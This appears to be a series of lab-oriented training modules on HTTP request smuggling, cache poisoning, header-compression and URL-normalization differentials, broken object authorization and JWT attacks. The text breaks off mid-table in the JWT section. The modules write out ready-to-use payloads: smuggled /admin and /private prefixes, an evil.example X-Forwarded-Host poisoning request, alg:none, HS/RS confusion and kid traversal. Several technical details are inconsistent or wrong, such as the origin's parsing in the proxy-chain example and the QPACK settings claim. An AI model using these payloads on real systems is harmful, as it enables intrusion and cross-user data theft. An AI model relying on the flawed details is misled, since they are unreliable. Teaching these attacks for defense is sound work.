===MODULE===
TITLE: HTTP/2 Request Smuggling: The Conversion Boundary
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how HTTP/2 binary framing is downgraded to HTTP/1.1 at a reverse proxy and how conflicting length signals create a desync.
OBJECTIVES: Model the HTTP/2-to-HTTP/1.1 downgrade | Detect H2.CL and H2.TE desync | Harden the front-end length rewrite
TAKEAWAYS: Frames do not carry lengths the way H1 does | Downgraded requests can carry two length signals | The back-end sees a different stream than the front-end
PRACTICE: In a local lab with an HTTP/2 front-end and HTTP/1.1 back-end at <LAB_HOST>, replay a request carrying both a Content-Length and a transfer-encoding header to observe queue desync.
SOURCES: None
---
## Core idea
HTTP/2 does not use `Content-Length` or `Transfer-Encoding` the way HTTP/1.1 does. A request is a sequence of binary frames: a `HEADERS` frame carrying an HPACK-compressed header block, zero or more `DATA` frames, and an `END_STREAM` flag that marks the true boundary. When a front-end terminates HTTP/2 and speaks HTTP/1.1 to an origin, it must *synthesize* a framing signal. If it copies a client-supplied `Content-Length` or `Transfer-Encoding` header into the downgraded request instead of generating its own, the two layers disagree about where one request ends and the next begins.

The mental model is a "translation seam." The client thinks in frames, the front-end thinks in headers, and the back-end thinks in bytes. A desync occurs when the seam forwards a length signal it did not compute. Classify variants by what the front-end forwards: **H2.CL** (it keeps an attacker-set `Content-Length`), **H2.TE** (it keeps `Transfer-Encoding: chunked`), and **H2.TE.CL** (it keeps both). Impact is the classic family: request queue poisoning, cache poisoning, or ACL bypass on a shared back-end socket.

### Step-by-step method (lab only)
1. Confirm the front-end speaks HTTP/2 (ALPN `h2`) while the origin is H1: `curl --http2 -I https://<LAB_HOST>/`.
2. Capture the exact header block your client emits; note whether a `content-length` pseudo-header is present.
3. Send a POST whose HEADERS block contains a `content-length` smaller than the DATA frame length. Observe whether the front-end rejects it or forwards it.
4. Append a smuggled prefix request in the leftover bytes and check whether a later innocent request receives the smuggled response.
5. Repeat with `transfer-encoding: chunked` in the HEADERS block, using a chunked body that terminates early.

### Concrete example
```http
POST /search HTTP/1.1
Host: <LAB_HOST>
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /admin HTTP/1.1
Host: <LAB_HOST>
```
In an H2.CL lab the HEADERS frame carries `content-length: 6` while the DATA frame carries far more. The front-end forwards `Content-Length: 6`, so the origin reads six bytes, then treats `GPOST /admin...` as the next request line.

| Variant | Front-end forwards | Back-end trusts | Typical result |
|---|---|---|---|
| H2.CL | Client CL | CL | Early body truncation |
| H2.TE | Client TE | Chunked | Prefix smuggling |
| H2.TE.CL | Both | First wins per parser | Framework-dependent differential |

### Bypass and defense pairs
- Bypass: lowercase or duplicated `content-length` values that only the origin deduplicates. Defense: strip *all* length and hop-by-hop headers from the H2 block and recompute length from DATA frames.
- Bypass: `transfer-encoding` smuggled inside a trailer. Defense: reject any HEADERS block containing either length signal.

### Common mistakes
- Assuming HTTP/2 eliminates smuggling; the downgrade reintroduces it.
- Testing only CL.TE while the bug lives in the H2 seam.
- Forgetting that gRPC-over-H2 has no body framing conflict, which makes it a useful control case.

### Knowledge check
**Q:** Why is `END_STREAM` not a safe substitute for a validated length at the origin?
**A:** Because the origin speaks H1 and never sees the H2 frame boundary. Only the front-end does; if it forwards attacker-controlled length headers, the origin parses those instead.

===MODULE===
TITLE: HTTP/3 and QUIC Smuggling Differentials
LEVEL: Advanced
MINUTES: 60
SUMMARY: Explore how QUIC streams, QPACK, and mandatory integrity affect request boundary trust when HTTP/3 is translated to older protocols.
OBJECTIVES: Model HTTP/3 stream boundaries | Identify translation points that reintroduce H1 framing | Test QPACK and stream-reset edge cases
TAKEAWAYS: QUIC streams are authoritative only inside the QUIC layer | Every downgrade re-creates a framing decision | QPACK dynamic table state can differ across hops
PRACTICE: On a local HTTP/3 lab at <LAB_HOST> behind an HTTP/1.1 origin, vary stream FIN timing and observe how the gateway synthesizes Content-Length.
SOURCES: None
---
## Core idea
HTTP/3 runs over QUIC, where each request occupies its own stream and the FIN flag closes it. There is no `Content-Length` ambiguity *within* QUIC: the stream length is the message length. Security problems appear at the gateway that translates HTTP/3 to HTTP/1.1 or HTTP/2, because that gateway again has to decide what length to emit. If it mirrors client headers instead of deriving them from stream state, the old H2.CL and H2.TE classes reappear through a new transport.

The mental model is "authority per layer." Inside QUIC, the transport has authority. After translation, the gateway's configuration has authority. An attacker who can inject a header into the QPACK block may influence the gateway's decision. QPACK uses a dynamic table shared across streams; if a gateway and an origin maintain different table states, header values can be decoded differently on each side. Stream resets (`RESET_STREAM`) can also abandon a body mid-stream: the gateway may have already committed a `Content-Length` while the client abandons the stream, leaving a truncated request that the origin interprets as a new one.

### Step-by-step method (lab only)
1. Verify HTTP/3 support: `curl --http3 -I https://<LAB_HOST>/`.
2. Map the chain with a traceroute-style probe: note whether traffic is terminated at an edge, then re-originated over TCP.
3. Send a POST over H3 with a header block containing `content-length`, then close the stream early with a FIN. Check the origin's view via a debug echo endpoint.
4. Vary QPACK dynamic-table insertions by sending a prior request that defines a header name as an indexed reference, then reuse that index in a second request.
5. Test `RESET_STREAM` after sending a partial body and observe whether the gateway forwards the partial request.

### Concrete example
```http
:method: POST
:path: /upload
:authority: <LAB_HOST>
content-length: 4
content-type: application/x-www-form-urlencoded
```
The QUIC stream actually carries 40 bytes. The gateway trusts the header and emits `Content-Length: 4` downstream. The remaining 36 bytes become a second request at the origin.

| Layer | Authority over length | Failure mode |
|---|---|---|
| QUIC stream | FIN / stream size | None if trusted |
| H3 gateway | Configured rewrite | Mirrors client header |
| H1 origin | Parsed headers | Reads wrong byte count |

### Bypass and defense pairs
- Bypass: send `content-length` as a QPACK indexed name that the gateway resolves differently than the client intended. Defense: never forward client-supplied length headers; derive length from stream bytes.
- Bypass: reset a stream after the gateway has committed framing. Defense: buffer the full stream before emitting downstream.

### Common mistakes
- Assuming encryption prevents desync; it protects transport, not header semantics.
- Testing only over TCP and missing H3-only translation paths.
- Ignoring QPACK state as "just compression."

### Knowledge check
**Q:** What single rule removes H3-to-H1 desync regardless of QPACK tricks?
**A:** Derive the downstream length exclusively from bytes actually received on the stream, and strip all client-supplied length headers.

===MODULE===
TITLE: CL/TE Edge Cases: Oblivious and Differential Parsers
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study parser-specific decisions when both Content-Length and Transfer-Encoding are present, including oblivious proxies and whitespace tricks.
OBJECTIVES: Classify CL.TE, TE.CL, and TE.TE behavior | Exploit whitespace and duplicate-header normalization | Choose reliable detector payloads
TAKEAWAYS: Two parsers can both be "correct" yet disagree | Oblivious proxies forward conflicting headers untouched | Header normalization is a security control
PRACTICE: Against a local dual-stack proxy at <LAB_HOST>, craft requests with obfuscated `Transfer-Encoding` tokens to map which layer honors which header.
SOURCES: None
---
## Core idea
When a request carries both `Content-Length` (CL) and `Transfer-Encoding` (TE), RFCs say TE wins and CL should be ignored or rejected. Many real stacks do neither consistently. A front-end that forwards both headers unchanged is *oblivious*; a back-end that prefers CL gives CL.TE; one that prefers chunked gives TE.CL. When both layers prefer chunked but disagree on which token is valid (TE.TE), an obfuscated second token becomes the discriminator. The core skill is not memorizing payloads but mapping *who parses which header first*.

The mental model is a decision table. Each hop is a parser with a preference order and a normalization step. Whitespace, casing, duplicate headers, and token lists are the inputs to that normalization. `Transfer-Encoding: chunked, foo` is valid to some parsers and rejected by others; a proxy that strips `foo` may turn a rejected request into an accepted one. Similarly, `Content-Length: 5, 5` is deduplicated by some servers into a single value, while others treat it as malformed. These tiny differences are what make desync reliable across heterogeneous chains.

### Step-by-step method (lab only)
1. Establish a baseline: send a well-formed chunked request and confirm a normal response through <LAB_HOST>.
2. Probe CL.TE with a body where CL is short and TE chunked is complete; look for a timeout differential (smuggled prefix waiting for more bytes).
3. Probe TE.CL with a chunked body that ends early and a CL that covers the leftover bytes.
4. For TE.TE, vary the token: `chunked`, `chunked, foo`, `foo, chunked`, `Chunked`, `chunked ` (trailing space), and a duplicate TE header.
5. Record each variant's outcome as accepted, rejected, or timed out; the pattern reveals the chain's preference order.

### Concrete example
```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Length: 4
Transfer-Encoding: chunked

0

SMUGGLED
```
If the front-end honors CL it forwards four bytes; the origin sees chunked and reads `0` then treats `SMUGGLED` as the next request prefix.

| Pattern | Front-end | Origin | Signal |
|---|---|---|---|
| CL.TE | CL | TE | Timeout then response shift |
| TE.CL | TE | CL | Immediate 400 or desync |
| TE.TE | First token | Second token | Token-dependent |

### Bypass and defense pairs
- Bypass: `Transfer-Encoding: chunked, identity`  -  some stacks drop `identity` and accept chunked. Defense: reject any TE header that is not exactly `chunked`.
- Bypass: duplicate CL headers with different values. Defense: reject duplicate CL outright rather than choosing one.

### Common mistakes
- Using one canonical payload for every target instead of mapping the chain.
- Ignoring timeouts as "the server is down" when they indicate a waiting parser.
- Forgetting that HTTP/2 clients cannot emit TE directly; you must use raw sockets or an H1 front-end.

### Knowledge check
**Q:** If a front-end deduplicates `Content-Length: 4, 4` to `4` but the origin rejects duplicates, which class applies?
**A:** A normalization differential, not classic CL.TE; the front-end changes the request shape before the origin parses it.

===MODULE===
TITLE: Proxy Chains and Desync Propagation
LEVEL: Advanced
MINUTES: 75
SUMMARY: Trace how a framing error propagates through multiple caches, WAFs, and load balancers, and how to localize the vulnerable hop.
OBJECTIVES: Map a multi-hop request path | Localize the hop that changes framing | Exploit socket reuse across tenants
TAKEAWAYS: Each hop may normalize or forward headers independently | One bad hop can poison every downstream socket | Hop locality is found by differential probing
PRACTICE: Build a local chain of two proxies and an origin at <LAB_HOST>, then inject a prefix request and determine which proxy rewrote the length header.
SOURCES: None
---
## Core idea
Real deployments rarely have a single front-end. A request may pass through a CDN, a WAF, a load balancer, and an application gateway before reaching an origin. Each hop may terminate and re-originate the connection, and each may make its own framing decision. A desync introduced at hop 1 can survive hop 2 unchanged, be "fixed" by hop 3, or be amplified when hop 4 reuses a poisoned upstream socket for unrelated tenants. The security boundary is therefore the *set* of connection pools, not individual hosts.

The mental model is a relay race with batons. Each relay runner (hop) may rewrite the baton (headers). If runner 1 hands off a baton that says "this package is 10 bytes" while runner 2 counts 20, the extra 10 bytes become a new package for runner 3. Because connection pools are shared, the misattributed bytes are delivered to whichever user next uses that socket. That is why impact escalates from a single request anomaly to cross-user cache poisoning and credential leakage.

### Step-by-step method (lab only)
1. Enumerate hops using `Via`, `X-Forwarded-For`, `Server`, and timing differences from <LAB_HOST>.
2. For each hop, determine whether it terminates TLS and whether it rewrites length headers, using a debug echo service at the origin.
3. Inject a benign marker prefix (e.g., `X-Marker: hop1`) and see which downstream logs record it.
4. Force socket reuse: send desync payload, then a request from a "victim" session; check whether the victim receives the marker response.
5. Isolate by disabling hops one at a time in your lab configuration and repeating.

### Concrete example
```http
POST /health HTTP/1.1
Host: <LAB_HOST>
Content-Length: 8
Transfer-Encoding: chunked

0

GET /private HTTP/1.1
Host: <LAB_HOST>
```
Hop 1 (CDN) forwards both; hop 2 (LB) honors CL and emits 8 bytes; hop 3 (origin) honors chunked and parses `GET /private` as a fresh request.

| Hop | Behavior | Effect on desync |
|---|---|---|
| CDN | Forwards both headers | Preserves |
| WAF | Rejects duplicates | Blocks |
| LB | Recomputes CL from TE | Repairs |
| Origin | Honors CL | Consumes prefix |

### Bypass and defense pairs
- Bypass: exploit a hop that strips `Transfer-Encoding` but leaves CL, converting TE.CL into CL.TE mid-chain. Defense: every hop must reject conflicting length headers rather than normalize them.
- Bypass: reuse a poisoned socket across virtual hosts on the same origin pool. Defense: isolate upstream pools per tenant and disable connection reuse where desync is suspected.

### Common mistakes
- Assuming the WAF protects the origin; WAFs often parse a different framing than the origin.
- Localizing by host name instead of by connection pool.
- Testing only the first request after desync instead of the next one on the same socket.

### Knowledge check
**Q:** Why can a hop that "fixes" the header still leave the system vulnerable?
**A:** Because it may repair framing only for its own connection while a different pool downstream still holds a poisoned socket from earlier traffic.

===MODULE===
TITLE: Cache Key Internals and Desync-Driven Poisoning
LEVEL: Advanced
MINUTES: 75
SUMMARY: Reverse-engineer cache key construction and show how a smuggled prefix can attach attacker content to a victim URL.
OBJECTIVES: Derive a cache key from headers and cookies | Find key normalization gaps | Weaponize a desync into stored poisoning
TAKEAWAYS: The cache key is often narrower than the response-determining inputs | Vary headers can create split keys | Poisoning persists until TTL expiry
PRACTICE: In a local lab at <LAB_HOST> with a caching proxy, inject a response via smuggling and confirm a different session receives it from cache.
SOURCES: None
---
## Core idea
A cache stores responses under a *key* built from selected request attributes, typically method, host, and path, sometimes plus `Accept-Encoding`, cookies, or query parameters. The response, however, is determined by the full request. Whenever the key omits an input that changes the response, two different requests collide. Desync turns this from a theoretical collision into a write primitive: a smuggled prefix can cause the cache to store an attacker-chosen response body under a victim's key.

The mental model is a hash map with a lossy key. Think of the key function as a fingerprint that ignores certain fingers. You first reverse-engineer which attributes are in the fingerprint by observing `Age`, `X-Cache`, and `CF-Cache-Status` headers while varying one input at a time. Then you find an input that changes the response but not the fingerprint. Finally, via desync you control the response that gets stored on the next request, so the victim's ordinary GET retrieves your content.

### Step-by-step method (lab only)
1. At <LAB_HOST>, vary query strings, headers (`Accept`, `X-Forwarded-Host`), and cookies one at a time; watch for cache HIT/MISS flips.
2. Identify an unkeyed input that affects response content (e.g., `X-Forwarded-Host` reflected in a canonical URL).
3. Determine the cache's handling of `Vary`: a missing `Vary: Accept-Encoding` means gzip and identity responses share a key.
4. Use a smuggling primitive to deliver a response whose body contains attacker markup, and have it stored under the victim path.
5. Fetch the victim path in a clean session and confirm the poisoned body is served with a fresh `Age`.

### Concrete example
```http
GET /home HTTP/1.1
Host: <LAB_HOST>
X-Forwarded-Host: evil.example

HTTP/1.1 200 OK
Age: 2
X-Cache: HIT
```
If `X-Forwarded-Host` is unkeyed but reflected into a `<link rel=canonical>` tag, every visitor to `/home` receives attacker-controlled markup until purge.

| Key input | Usually keyed? | Risk when omitted |
|---|---|---|
| Method + path | Yes | Low |
| Query string | Sometimes | Parameter pollution |
| Accept-Encoding | Often | Compression differential |
| X-Forwarded-* | Rarely | Host-header poisoning |

### Bypass and defense pairs
- Bypass: add a duplicate query parameter so the cache key uses the first value while the app uses the last. Defense: canonicalize parameters before both keying and routing.
- Bypass: exploit a `Vary` header that lists a header the cache ignores. Defense: include every response-influencing header in the key.

### Common mistakes
- Assuming query strings are always keyed.
- Confusing browser cache with shared cache; only shared caches create cross-user impact.
- Forgetting to wait for TTL or to send a cache-busting request during verification.

### Knowledge check
**Q:** What condition must hold for poisoning to be cross-user rather than self-only?
**A:** The poisoned response must be stored under a key the victim's requests also produce, and the cache must be shared.

===MODULE===
TITLE: HPACK and QPACK Header Compression Differentials
LEVEL: Advanced
MINUTES: 60
SUMMARY: Investigate how compression context desynchronization between hops can alter headers after decoding.
OBJECTIVES: Explain dynamic table state across hops | Craft index-based header references | Detect decoder state divergence
TAKEAWAYS: Compressed headers are stateful references, not literal strings | Different table states decode to different headers | Compression is part of the trust boundary
PRACTICE: In a local H2 lab at <LAB_HOST>, intentionally desync the HPACK table between a proxy and origin and observe header reinterpretation.
SOURCES: None
---
## Core idea
HPACK (HTTP/2) and QPACK (HTTP/3) compress headers using a static table plus a dynamic table populated by previous requests. A compressed header is not a string; it is an instruction such as "emit the name at index 12 with this literal value." If two hops maintain different dynamic table states, the same bytes decode to different headers on each side. That is a compression differential, and it is especially dangerous because the front-end's decoded view (used for routing or ACLs) may differ from the origin's view (used for application logic).

The mental model is a shared dictionary with two independent copies. If a proxy inserts `:authority: <LAB_HOST>` at index 62 but the origin never saw that insertion, a later reference to index 62 yields different values. QPACK adds a further wrinkle: its dynamic table is explicitly acknowledged via `SETTINGS_HEADER_TABLE_SIZE` and stream acknowledgements, so a gateway that delays acknowledgements can desynchronize table state across streams. Header size limits also interact: a proxy that enforces a smaller max header list may truncate a decoded block differently than the origin.

### Step-by-step method (lab only)
1. From <LAB_HOST>, send a request that inserts several large headers into the dynamic table, establishing a known baseline.
2. Send a follow-up request referencing those indices with literal values, using a raw H2 client (`h2spec` or a custom frame builder).
3. Compare the origin's decoded header log with the proxy's access log.
4. For QPACK, vary acknowledgement timing by introducing stream delays and observe whether decoded values diverge.
5. Test header list size limits by padding a value near the configured maximum and checking for differential truncation.

### Concrete example
```text
HEADERS frame (HPACK):
  0x82                 :method GET (static index 2)
  0xBE 0x3E ...         indexed name 62, literal value "/admin"
```
If index 62 at the proxy is `:path` but at the origin is `:authority`, the proxy routes `/admin` while the origin sees an authority change.

| State | Proxy table | Origin table | Decoded result |
|---|---|---|---|
| Synced | Same | Same | Identical headers |
| Divergent | Different | Different | ACL bypass possible |
| QPACK unacked | Advanced | Not advanced | Scheduled decode stalls |

### Bypass and defense pairs
- Bypass: force table divergence with a header the proxy inserts but the origin rejects. Defense: reset compression context per connection at trust boundaries.
- Bypass: exploit size-limit truncation to cut a header mid-value. Defense: reject decoded header lists that exceed limits rather than truncating.

### Common mistakes
- Treating compression as transparent and therefore untestable.
- Using high-level clients that hide frame-level control.
- Ignoring SETTINGS frames as security-relevant configuration.

### Knowledge check
**Q:** Why can an ACL enforced at the proxy be bypassed by compression divergence?
**A:** Because the proxy's decoded header value may differ from the origin's decoded value; the ACL checks one interpretation while the app uses another.

===MODULE===
TITLE: Reverse Proxy Normalization Differentials
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how proxies normalize paths, schemes, and absolute URIs differently from origins, enabling ACL and routing bypasses.
OBJECTIVES: Map URL normalization steps across hops | Exploit encoded and absolute-form differences | Align proxy and origin parsing
TAKEAWAYS: Normalization order is security-critical | Absolute-form URIs can hide the real path | encodings are decoded at different stages
PRACTICE: On a local lab at <LAB_HOST>, probe `/admin`, `/%61dmin`, and absolute-form requests to compare proxy and origin path views.
SOURCES: None
---
## Core idea
Before a request reaches application code, each hop normalizes the URL: decoding percent-encodings, collapsing dot segments, resolving duplicate slashes, and choosing between origin-form and absolute-form. The *order* of these operations matters. A proxy that decodes `%2e%2e` before collapsing dot segments sees a different path than an origin that collapses first and decodes later. Such normalization differentials can bypass path-based ACLs, route a request to a different internal service, or defeat a WAF signature.

The mental model is a pipeline of transformations with no shared specification of ordering. You can think of each hop as a function `f_i(path)`. The proxy enforces `ACL(f_proxy(path))` while the application dispatches on `f_origin(path)`. You win when `f_proxy(path)` is benign and `f_origin(path)` is sensitive. Absolute-form requests (`GET http://<LAB_HOST>/admin HTTP/1.1`) add another dimension: some proxies parse the authority from the absolute URI while others use the Host header, allowing a mismatch that confuses virtual-host routing.

### Step-by-step method (lab only)
1. Send a baseline request to <LAB_HOST> and record the origin's logged path via a debug endpoint.
2. Probe encodings: `/admin`, `/%61dmin`, `/%2fadmin`, `/admin%2f`, `/a/../admin`, `//admin`.
3. Probe absolute-form and compare the Host header to the URI authority.
4. Use a header that only the proxy adds (e.g., `X-Original-URL`) and see whether the origin honors it.
5. Compare which hop makes the routing decision and which makes the authorization decision; the gap is the exploitable surface.

### Concrete example
```http
GET /%2e%2e/admin HTTP/1.1
Host: <LAB_HOST>
X-Original-URL: /public
```
Proxy decodes to `/../admin`, collapses to `/admin`, blocks by ACL. Origin sees `/%2e%2e/admin` and its framework decodes to `/admin` *after* routing to the admin handler  -  a mismatch if ACL and dispatch use different functions.

| Input | Proxy view | Origin view | Risk |
|---|---|---|---|
| `/%61dmin` | `/admin` or literal | `/admin` | ACL bypass |
| `//admin` | `/admin` | `//admin` | Route mismatch |
| Absolute URI | Authority from URI | Authority from Host | Vhost confusion |

### Bypass and defense pairs
- Bypass: mixed encoding (`%252e%252e`) that only one hop double-decodes. Defense: decode exactly once, canonicalize, then authorize on the canonical form.
- Bypass: `X-Original-URL` header trusted by a framework that the proxy does not sanitize. Defense: strip all internal routing headers at the edge.

### Common mistakes
- Testing only percent-encoding and missing dot-segment ordering.
- Authorizing on the raw path while routing on the decoded path.
- Assuming the WAF and application share a URL parser.

### Knowledge check
**Q:** Why is "decode, then canonicalize, then authorize" safer than "authorize, then decode"?
**A:** Because authorization runs on the same canonical string the application will dispatch on, eliminating the parser-order gap.

===MODULE===
TITLE: Connection-State Desync and Response Queue Poisoning
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how leftover bytes on a persistent connection cause responses to be delivered to the wrong user, and how to verify impact safely.
OBJECTIVES: Understand persistent connection pooling | Turn a prefix smuggle into queue poisoning | Verify cross-request impact in a lab
TAKEAWAYS: HTTP keep-alive makes responses and requests positional | One poisoned socket affects the next user of that socket | Timing reveals hidden queues
PRACTICE: In a local lab at <LAB_HOST>, smuggle a request that generates a distinctive response, then issue a victim request and observe the shift.
SOURCES: None
---
## Core idea
HTTP/1.1 keep-alive multiplexes sequential requests over one TCP connection. Requests and responses are matched by *order*, not by an explicit ID. If you can inject a partial request whose bytes are interpreted as the start of the next request, you add an extra entry to the response queue. Every subsequent response is shifted by one. When the origin pool is shared, the "next user" of that socket is an arbitrary visitor, which turns a framing bug into cross-user information disclosure or session hijacking.

The mental model is a queue with no labels. The origin reads request N from the socket and writes response N back. If you smuggle a complete request as a prefix, the origin answers it with response N+1; the legitimate request N+1 now receives response N+2. To verify safely in a lab, make the smuggled response uniquely identifiable, such as a static marker page, then show that a clean client receives that marker on an unrelated URL.

### Step-by-step method (lab only)
1. Establish a baseline sequence of requests through <LAB_HOST> and record response order.
2. Send a smuggling payload whose prefix is a complete request to a marker endpoint.
3. Immediately send a benign request from a second client and observe whether it receives the marker response.
4. Use a long delay in the smuggled handler to create a measurable timing gap, confirming an extra queued response.
5. Repeat with connection reuse disabled on the client to confirm the effect is server-side.

### Concrete example
```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Length: 6
Transfer-Encoding: chunked

0

GET /marker HTTP/1.1
Host: <LAB_HOST>
X: 
```
The trailing `X: ` header leaves the smuggled request incomplete, so the next legitimate request's headers complete it  -  a classic queue-poisoning setup.

| Observation | Meaning |
|---|---|
| Extra response with `Age: 0` | Smuggled response queued |
| Next request gets wrong body | Positional mismatch confirmed |
| Timeout of ~N seconds | Handler waiting for finishing bytes |

### Bypass and defense pairs
- Bypass: use a HEAD request as the smuggled prefix so the origin suppresses the body and the shift is silent. Defense: reject conflicting framing before any handler runs.
- Bypass: target an internal admin path reachable only from the origin's network position. Defense: authenticate at the application layer, not by network origin alone.

### Common mistakes
- Concluding "not vulnerable" when the smuggled request simply timed out.
- Using a victim request that itself errors, masking the shift.
- Testing on a single connection without confirming shared pooling.

### Knowledge check
**Q:** Why does disabling client-side keep-alive not fix a server-side queue poisoning issue?
**A:** Because the poisoned socket lives in the server's upstream connection pool; the client's connection settings do not change how the origin reuses its own sockets.

===MODULE===
TITLE: BOLA and BFLA at Scale: The Subject-Object-Action Matrix
LEVEL: Advanced
MINUTES: 75
SUMMARY: Treat broken object-level and function-level authorization as a systematic matrix problem rather than a per-endpoint bug hunt.
OBJECTIVES: Distinguish BOLA from BFLA | Build a reusable cross-account test matrix | Detect mass-assignment privilege escalation
TAKEAWAYS: Object IDs do not grant authorization | Every action needs a policy check | Sequential or UUID IDs are equally unsafe without checks
PRACTICE: Using two owned accounts on a local app at <LAB_HOST>, replay every identified object ID with the other account's token and record the results.
SOURCES: None
---
## Core idea
BOLA (Broken Object Level Authorization) asks "may this subject access this object?" BFLA (Broken Function Level Authorization) asks "may this subject perform this action?" They are different axes of the same matrix: subjects x objects x actions. A secure service checks the specific cell before executing. An insecure service checks a few cells and assumes the rest are implied by a hidden front-end button, an unguessable identifier, or a single role check at login.

The mental model is a spreadsheet with a row for each user, a column for each object, and an action label per cell. Most teams validate only that the user is logged in, which is a check on the row header, not on the cell. At scale, this fails because endpoints multiply: each new export, search, bulk-delete, and webhook adds cells that nobody explicitly authorized. The fix is to make the policy check mandatory in the data-access layer so it cannot be forgotten.

### Step-by-step method (lab only)
1. Create accounts A and B in your owned lab at <LAB_HOST> and capture both tokens.
2. Enumerate every endpoint accepting an identifier: path, query, body, header, and GraphQL argument.
3. For each endpoint, replay A's object identifiers with B's token and record status, body, and side effects.
4. Repeat for verbs: GET, PUT, PATCH, DELETE, and method-override headers.
5. Test mass assignment by adding privileged fields (`role`, `owner_id`, `is_admin`) to otherwise legitimate JSON bodies.

### Concrete example
```http
GET /api/v2/users/1042/invoices HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <TOKEN_B>
```
A `200` with invoices belonging to user 1042 (who is A) proves object-level failure. A mass-assignment probe:
```json
{"displayName":"Bob","role":"admin","owner_id":"<UUID_B>"}
```
If `role` is silently accepted, a function-level escalation exists.

| Flaw | Question failed | Typical evidence |
|---|---|---|
| BOLA | Subject vs object | Other user's record returned |
| BFLA | Subject vs action | Normal user calls admin endpoint |
| Mass assignment | Subject vs field | Privileged field persisted |

### Bypass and defense pairs
- Bypass: UUIDs assumed unguessable but leaked through logs or `Referer`. Defense: authorize on every identifier regardless of entropy.
- Bypass: `X-HTTP-Method-Override: DELETE` bypassing a method-based guard. Defense: enforce policy independent of verb.

### Common mistakes
- Testing only GET endpoints and missing state-changing operations.
- Assuming a single 403 means the whole endpoint family is safe.
- Forgetting that "read" is itself a privileged action.

### Knowledge check
**Q:** Why does switching IDs from integers to UUIDs not fix BOLA?
**A:** Because authorization is about permission, not guessability; an object reference that leaks through any channel is still unauthorized access.
===MODULE===
TITLE: Tenant Isolation and Row-Level Security
LEVEL: Advanced
MINUTES: 75
SUMMARY: Learn to verify that every data path carries an enforceable tenant predicate, including caches, search indices, and background jobs.
OBJECTIVES: Map all tenant-scoped data paths | Verify database-enforced isolation | Find cross-tenant leaks in async systems
TAKEAWAYS: Isolation must be enforced at the data layer | Every derived store needs a tenant dimension | Impersonation headers must never set scope
PRACTICE: In a lab at <LAB_HOST> with two tenants, query reports, exports, and cached pages to confirm no cross-tenant data is reachable.
SOURCES: None
---
## Core idea
Multi-tenant security rests on a single invariant: every query, cache entry, index lookup, and job payload is scoped to the authenticated tenant. When scope is a convention in application code, one forgotten `WHERE` clause breaks isolation. When scope is enforced by the database through row-level security (RLS), the predicate is attached to the table and survives application changes. The mental model is a tenant boundary implemented as a mandatory filter that the runtime injects, not as a value developers remember to pass.

The failure surface is wider than SQL. Search indices, object storage, analytics pipelines, webhooks, and WebSocket subscriptions are all derived stores that need their own tenant dimension. A report export may run in a background job where no authenticated user exists, so the job must carry tenant context explicitly. A cache key that omits tenant allows tenant B to receive tenant A's rendered page.

### Step-by-step method (lab only)
1. Enumerate all data access paths at <LAB_HOST>: ORM queries, raw SQL, search, cache, exports, and async jobs.
2. For each path, identify where tenant scope originates and whether the storage layer enforces it.
3. Using two owned tenants, replay identifiers and query parameters across boundaries.
4. Inspect cache keys and index documents for a tenant field.
5. Trigger a background job with tenant B context and verify it cannot read tenant A rows.

### Concrete example
```http
GET /api/v1/reports?tenant_id=TENANT_A HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <TOKEN_B>
```
If TENANT_A's report is returned, the handler trusts a client-supplied scope. A database-side policy:
```sql
CREATE POLICY tenant_isolation ON invoices
  USING (tenant_id = current_setting('app.tenant_id')::uuid);
```
With this policy, even a query missing the predicate returns only the current tenant's rows.

| Path | Scope source | Leak if omitted |
|---|---|---|
| ORM query | Session tenant | Cross-tenant rows |
| Cache key | Request URL | Wrong tenant's HTML |
| Search index | Indexed field | Global document set |
| Background job | Job payload | Batch export of all tenants |

### Bypass and defense pairs
- Bypass: `X-Tenant-ID` header trusted by a middleware that overrides session scope. Defense: derive tenant solely from the authenticated session and reject conflicting headers.
- Bypass: cache key based on path only. Defense: include tenant identifier in every shared cache key.

### Common mistakes
- Trusting a tenant ID from the request body.
- Applying RLS only to some tables, leaving join tables unguarded.
- Assuming admin tooling is out of scope; privileged paths are prime targets.

### Knowledge check
**Q:** Why is RLS stronger than adding `WHERE tenant_id = ?` in application code?
**A:** Because the database enforces the predicate for every query, including ones written later or issued by tools that forget the filter.
===MODULE===
TITLE: JWT Edge Cases: Algorithm, Key, and Claim Confusion
LEVEL: Advanced
MINUTES: 75
SUMMARY: Analyze JWT validation as a pipeline and exploit gaps between signature verification and claim authorization.
OBJECTIVES: Enumerate algorithm and key-resolution attacks | Validate every security-relevant claim | Prevent cross-service token replay
TAKEAWAYS: The token header must never choose the algorithm | Key metadata in the token is untrusted | Signature validity is not authorization
PRACTICE: Against a local API at <LAB_HOST>, decode issued tokens and test alg:none, HS/RS confusion, and audience mismatch in a controlled harness.
SOURCES: None
---
## Core idea
A JWT is a signed container of claims; its security comes from a signature covering header and payload. Edge-case attacks exploit *validation gaps*: accepting an unsigned token, confusing symmetric and asymmetric keys, trusting key metadata supplied by the token, or verifying the signature without authorizing the claims. The mental model is a pipeline: decode -> pin algorithm -> resolve key -> verify signature -> validate claims -> authorize. Different components often own different stages, and the seams are where bugs live.

Key attack classes: `alg:none` when a verifier skips signature checks; HS/RS confusion where an RS256 public key is reused as an HMAC secret; `kid` values used in path or SQL lookups; `jku`/`x5u` pointing to attacker-controlled key sets; embedded `jwk`; nested JWTs and JWE decryption oracles; and audience confusion where a token for service A is accepted by service B.

### Step-by-step method (lab only)
1. Decode tokens issued by <LAB_HOST> locally and list every header and payload claim.
2. Test `alg:none` with an empty signature and with a trailing dot.
3. Attempt HS256 signing with the service's RS256 public key as the shared secret.
4. Manipulate `kid` with traversal, null bytes, and SQL metacharacters against your lab key store.
5. Replay a token issued for a different client or audience and observe whether it is accepted.

### Concrete example
```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```
If the verifier builds a key path from `kid`, traversal can select a predictable file. A classic confusion payload signs with:
```text
HMAC-SHA256(publicKeyBytes, header + "." + payload)
```
which succeeds when the verifier switches to HMAC based on the token's own `alg`.

| Claim | Validate | Failure |
|---|---|---|
| `iss` | Exact expected string | Token from rogue issuer |
| `aud` | Exact match, not contains | Cross-service replay |
